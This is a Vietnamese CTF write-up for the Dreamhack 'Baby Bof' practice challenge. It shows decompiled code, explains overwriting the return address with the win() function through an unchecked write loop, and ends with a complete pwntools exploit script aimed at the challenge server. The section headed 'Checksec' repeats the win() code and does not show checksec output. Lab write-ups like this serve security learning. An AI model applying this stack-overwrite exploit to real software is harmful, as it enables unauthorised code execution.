# Challenge: Baby Bof

## Vấn đề
- [File challenge](https://github.com/haiwh07/CTFWriteUp/blob/main/dreamhack/baby_bof/deploy/baby-bof)
- Chương trình thực thi như sau:
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rdx
  __int64 v4; // rdx
  _QWORD name[2]; // [rsp+0h] [rbp-10h] BYREF

  proc_init(argc, argv, envp);
  printf("the main function doesn't call win function (0x%lx)!\n", win);
  printf("name: ");
  __isoc99_scanf("%15s", name);
  printf("GM GA GE GV %s!!\n: ", (const char *)name);
  puts("|  addr\t\t|  value\t\t|");
  for ( idx = 0LL; idx <= 15; ++idx )
    printf("|  %lx\t|  %16lx\t|\n", &name[idx], name[idx]);
  printf("hex value: ");
  __isoc99_scanf("%lx%c", &value, v3);
  printf("integer count: ");
  __isoc99_scanf("%d%c", &count, v4);
  for ( idx = 0LL; idx < count; ++idx )
    name[idx] = value;
  puts("|  addr\t\t|  value\t\t|");
  for ( idx = 0LL; idx <= 15; ++idx )
    printf("|  %lx\t|  %16lx\t|\n", &name[idx], name[idx]);
  return 0;
}
```
- Checksec:
```
void __noreturn win()
{
  __int64 buf[12]; // [rsp+0h] [rbp-70h] BYREF
  int v1; // [rsp+60h] [rbp-10h]
  int fd; // [rsp+6Ch] [rbp-4h]

  memset(buf, 0, sizeof(buf));
  v1 = 0;
  puts("You mustn't be here! It's a vulnerability!");
  fd = open("./flag", 0);
  read(fd, buf, 0x60uLL);
  puts((const char *)buf);
  exit(0);
}
```

## Giải pháp
- Chương trình chứa hàm win() có thể đọc flag, việc cho ta chỉ cần overwrite lúc chương trình chạy hàm for jmp về lại main thành hàm win là có được flag.
```
void __noreturn win()
{
  __int64 buf[12]; // [rsp+0h] [rbp-70h] BYREF
  int v1; // [rsp+60h] [rbp-10h]
  int fd; // [rsp+6Ch] [rbp-4h]

  memset(buf, 0, sizeof(buf));
  v1 = 0;
  puts("You mustn't be here! It's a vulnerability!");
  fd = open("./flag", 0);
  read(fd, buf, 0x60uLL);
  puts((const char *)buf);
  exit(0);
}
```
> Khai thác Buffer Overflow để lấy flag.

## Quá trình
- Khi debug chương trình, tôi thấy rằng offset tới main khi chạy for là 6 nên lúc chương trình cho nhập hex cần thay đổi thì ta sẽ nhập địa chỉ của hàm win().
> sla(b'value: ', hex(exe.sym['win']).encode())
- Sau đó chỉ cần nhập offset tới main là 6 là sẽ có flag.
> slna(b'count: ', 6)

## Script
```#!/usr/bin/env python3

from pwn import *

exe = ELF('baby-bof', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 23782)
else:
    p = process([exe.path])
GDB()

sla(b'name: ', b'0')
sla(b'value: ', hex(exe.sym['win']).encode())
slna(b'count: ', 6)

p.interactive()
```
